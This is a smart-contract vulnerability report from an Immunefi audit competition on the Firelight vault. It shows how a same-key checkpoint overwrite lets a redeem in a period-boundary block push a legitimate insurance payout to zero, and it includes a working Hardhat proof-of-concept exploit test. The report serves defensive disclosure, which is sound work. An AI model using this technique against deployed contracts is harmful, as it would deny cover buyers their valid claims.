# 88684 sc high checkpoint overwrites lead to loss of legitimate payouts

**Submitted on Aug 14th 2026 at 14:13:28 UTC by @IllIllI for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88684
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/lib/Checkpoints.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

`Checkpoints.Trace256.push` overwrites a checkpoint when a new write uses the same key as the latest checkpoint. All user-controlled asset flows in `FirelightVault` write `_traceTotalAssets` keyed by `block.timestamp`, so a `deposit`, `mint`, `redeem`, or `withdraw` mined in the exact block whose timestamp equals an aligned period boundary rewrites the `totalAssetsAt(capturePeriodStart)` snapshot. That snapshot is the exposure cap for `payout` and the collateral value used by `CoverOrderAllocator._computeAvailableCapacity`. A permissionless boundary-block redeem can permanently suppress a legitimate, consortium-approved claim payout to zero; a boundary-block deposit can inflate the snapshot and allow over-exposure.

## Vulnerability Details

The root cause is the same-key overwrite behavior in `Checkpoints.Trace256.push` (`contracts/core/lib/Checkpoints.sol:198-210`):

```solidity
(bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();
uint256 len = self._values.length;
uint256 lastValue = latest(self);
if (exists && key == lastKey) {
    self._values[len - 1] = value;       // overwrite on same key
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

All asset-mutating user paths write the `_traceTotalAssets` checkpoint trace:

* `deposit` / `mint` call `_depositFunds`, then `_logTrace(..., totalAssets after deposit, true)`.
* `redeem` / `withdraw` call `_logTrace(owner, ..., totalAssets - assets, true)`, recording a deflated total-assets value.
* `payout` also writes a checkpoint, but it is restricted to `PAYOUT_ROLE`.
* `checkpointTotalAssets` is restricted to `CHECKPOINT_ROLE`.

Because every transaction in a block shares the same `block.timestamp`, `totalAssetsAt(capturePeriodStart)` returns the final total-assets state of whatever block has timestamp exactly equal to `capturePeriodStart`. If a user operation is mined in that exact boundary block, it overwrites the period-start checkpoint.

This corrupted snapshot is then used in two critical places:

* `FirelightVault.payout` uses it as the per-incident exposure cap: `paidAmount = min(amount, min(assetsAtCapturePeriod, activePayableAmount))`
* `CoverOrderAllocator._computeAvailableCapacity` uses `vault.totalAssetsAt(vault.currentPeriodStart())` as the period-start collateral value.

{% stepper %}
{% step %}

## A vault shareholder holds shares

{% endstep %}

{% step %}

## Redeem at the period boundary

In the block whose timestamp equals the aligned period-start `P`, the shareholder calls `redeem(≈A)` for approximately the full total assets.
{% endstep %}

{% step %}

## Overwrite the checkpoint

`_logTrace` overwrites the key-`P` checkpoint with `A - X`, so `totalAssetsAt(P)` reports near zero.
{% endstep %}

{% step %}

## Assets remain pending withdrawal

The withdrawn assets are still physically in the vault as a pending withdrawal and are included in `activePayableAmount`.
{% endstep %}

{% step %}

## Approve a genuine incident

A genuine incident in that period is assessed and approved by the consortium.
{% endstep %}

{% step %}

## Payout is suppressed

`payout` executes with `assetsAtCapturePeriod ≈ 0`, so `paidAmount = 0`.
{% endstep %}

{% step %}

## Suppression is permanent

The suppression is permanent for that incident: later blocks append greater keys, no mechanism rewrites key `P`, and the payout window closes after the incident period and next period.
{% endstep %}
{% endstepper %}

The attacker can repeat this at every boundary. The redeemer avoids the period’s claim slashing while the protocol still counted their stake as backing cover; cover buyers are left with unpaid claims.

The reverse direction is also possible: a boundary-block `deposit` or `mint` inflates `totalAssetsAt(P)`, which inflates `_computeAvailableCapacity` and allows additional cover to be sold beyond the true period-start collateral.

## Impact Details

A permissionless shareholder can permanently suppress legitimate, consortium-approved claim payouts to zero for an entire period. The cover buyer’s claim is not paid even though the assessment and approval were genuine. The underlying assets remain in the vault as pending withdrawals or are withdrawn by the redeemer, so the claim obligation is defaulted while the redeemer escapes the period’s slashing.

In the inflation direction, boundary-block deposits can inflate the period-start collateral value used by `CoverOrderAllocator`, potentially allowing cover capacity to be sold without real backing assets at the period boundary. This can create over-exposure and further unpaid claims.

This is a direct manipulation of the protocol’s core settlement function. It harms cover buyers and the protocol, requires no trusted-role involvement, and is repeatable at every period boundary.

High - Theft of unclaimed yield, where the yield being stolen is the cover buyer's claim's value

## References

* `contracts/core/lib/Checkpoints.sol` — `Trace256.push`
* `contracts/core/FirelightVault.sol` — `_logTrace`, `totalAssetsAt`, `payout`, `redeem`, `withdraw`, `deposit`, `mint`
* `contracts/core/CoverOrderAllocator.sol` — `_computeAvailableCapacity`

## Proof of Concept

The header of the PoC below contains placement and run instructions.

```javascript
/**
 * FirelightCore — Proof of Concept
 * =====================================================================
 *
 * Finding demonstrated
 * ---------------------------------------------------------------------
 * The `totalAssetsAt(capturePeriodStart)` snapshot — which `FirelightVault.payout`
 * uses as its per-incident exposure cap and which `CoverOrderAllocator._computeAvailableCapacity`
 * uses as period-start collateral — is derived from the `_traceTotalAssets` checkpoint
 * trace (see `contracts/core/lib/Checkpoints.sol`, `Trace256.push`).
 *
 * Every asset-mutating user path (`deposit`, `mint`, `redeem`, `withdraw`) writes this
 * trace via `_logTrace` in `contracts/core/FirelightVault.sol`, keyed by `block.timestamp`.
 *
 * `Trace256.push` overwrites the previous value whenever the incoming key equals the most
 * recent key (`if (exists && key == lastKey) self._values[len - 1] = value;`). Because all
 * transactions in a block share a single timestamp, any `deposit`/`mint`/`redeem`/`withdraw`
 * that is mined in a block whose timestamp equals an aligned period boundary rewrites (or
 * newly sets at that key) the checkpoint that `totalAssetsAt(capturePeriodStart)` will return
 * for that period.
 *
 * Deflationary case shown here: an attacker who redeems in the boundary block (timestamp ==
 * period-start) leaves a checkpoint of ~0 at that key, so `totalAssetsAt(capturePeriodStart)`
 * reports ~0 for the whole period. A genuine, consortium-approved incident captured in that
 * period then pays `min(amount, min(0, activePayableAmount)) = 0` — a legitimate claim is
 * permanently suppressed while the emptied vault assets sit in the pending-withdrawal bucket
 * and escape the period's slashing.
 *
 * Real code paths exercised
 * ---------------------------------------------------------------------
 * - `FirelightVault.redeem`   -> `_previewTotals` + `_requestWithdraw` + `_logTrace`
 *   (`contracts/core/FirelightVault.sol`, `redeem` and `_logTrace`).
 * - `Checkpoints.Trace256.push` same-key overwrite (`contracts/core/lib/Checkpoints.sol`).
 * - `FirelightVault.totalAssetsAt` -> `upperLookupRecent` lookup, used by
 *   `FirelightVault.payout` as `assetsAtCapturePeriod` and by
 *   `CoverOrderAllocator._computeAvailableCapacity` as period-start collateral.
 * - `FirelightVault.payout` computes `paidAmount = min(amount, min(assetsAtCapturePeriod,
 *   activePayableAmount))`, so a corrupted `assetsAtCapturePeriod == 0` forces `paidAmount = 0`.
 *
 * Where to put this file and how to run it
 * ---------------------------------------------------------------------
 * Drop this file at:  test/poc_boundary_checkpoint_overwrite.js
 * Run it from the repository root with:
 *      npx hardhat test test/poc_boundary_checkpoint_overwrite.js
 * (Optionally a single test: `--grep "boundary checkpoint"`.)
 *
 * The test uses the repository's own real vault fixture (`test/setup/fixtures.js`,
 * `deployVault`) so the configuration matches the existing suite (0-decimal asset,
 * period duration = 1 week). The exploit is reproduced purely with the permissionless
 * depositor/redeemer role and the standard vault roles, on the local Hardhat EVM —
 * never on a public network.
 */
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { deployVault } = require("./setup/fixtures.js");
const { expect } = require("chai");

describe("boundary checkpoint overwrite", function () {
  it("permissionless boundary redeem deflates totalAssetsAt(period-start) and zeroes a legitimate payout", async function () {
    const ctx = await loadFixture(
      deployVault.bind(null, {
        decimals: 0n,
        initial_deposit_limit: 100n,
      })
    );
    const { firelight_vault, payout_signer, payout_receiver, users, utils, config } = ctx;

    const WEEK = config.period_configuration_duration;
    // Start of the current period (period 0) == the vault epoch.
    const period0Start = await firelight_vault.currentPeriodStart();
    // Aligned start of the next period (period 1) — the boundary block timestamp.
    const boundary = period0Start + BigInt(WEEK);

    // 1) Honest deposit of 10 units into period 0.
    await utils.mintAndApprove(10n, users[0]);
    await firelight_vault.connect(users[0]).deposit(10n, users[0].address);
    expect(await firelight_vault.totalAssets()).to.equal(10n);

    // Correct (undisturbed) period-1 exposure snapshot: the deposit still on the books.
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(10n);

    // 2) Attacker redeems in the EXACT boundary block whose timestamp == period-1 start.
    //    Hardhat mines the redeem in a block stamped `boundary`.
    await time.setNextBlockTimestamp(boundary);
    await firelight_vault.connect(users[0]).redeem(10n, users[0].address, users[0].address);

    // 3) The redeem overwrote the key == boundary checkpoint with the deflated total.
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(0n);
    // The underlying assets are still physically in the vault, parked as a pending withdrawal.
    expect(await firelight_vault.withdrawAssets(2n)).to.equal(10n);
    expect(await firelight_vault.pendingWithdrawAssets()).to.equal(10n);

    // 4) A genuine incident is captured during period 1. Its capturePeriodStart == boundary,
    //    so the payout cap is read from the corrupted snapshot.
    const capturePeriod = await firelight_vault.currentPeriod();
    expect(capturePeriod).to.equal(1n);
    const captureTimestamp = boundary + 5n; // any timestamp inside period 1

    await firelight_vault.connect(payout_signer).payout(payout_receiver.address, 10n, captureTimestamp);

    // 5) The legitimate request of 10 pays ZERO — the whole claim for the period is suppressed;
    //    the 10 units remain stranded in the withdrawal bucket.
    expect(await ctx.token_contract.balanceOf(payout_receiver.address)).to.equal(0n);
    expect(await firelight_vault.withdrawAssets(2n)).to.equal(10n);
  });

  it("control: without the boundary redeem the same payout pays in full", async function () {
    const ctx = await loadFixture(
      deployVault.bind(null, {
        decimals: 0n,
        initial_deposit_limit: 100n,
      })
    );
    const { firelight_vault, payout_signer, payout_receiver, users, utils, config } = ctx;

    const WEEK = config.period_configuration_duration;
    const period0Start = await firelight_vault.currentPeriodStart();
    const boundary = period0Start + BigInt(WEEK);

    await utils.mintAndApprove(10n, users[0]);
    await firelight_vault.connect(users[0]).deposit(10n, users[0].address);
    expect(await firelight_vault.totalAssetsAt(boundary)).to.equal(10n);

    // Advance into period 1 without touching the boundary block.
    await time.increaseTo(boundary + 5n);

    const captureTimestamp = boundary + 1n;
    await firelight_vault.connect(payout_signer).payout(payout_receiver.address, 10n, captureTimestamp);

    // Uncorrupted snapshot caps the payout at 10 — the claim is fully honoured.
    expect(await ctx.token_contract.balanceOf(payout_receiver.address)).to.equal(10n);
  });
});
```
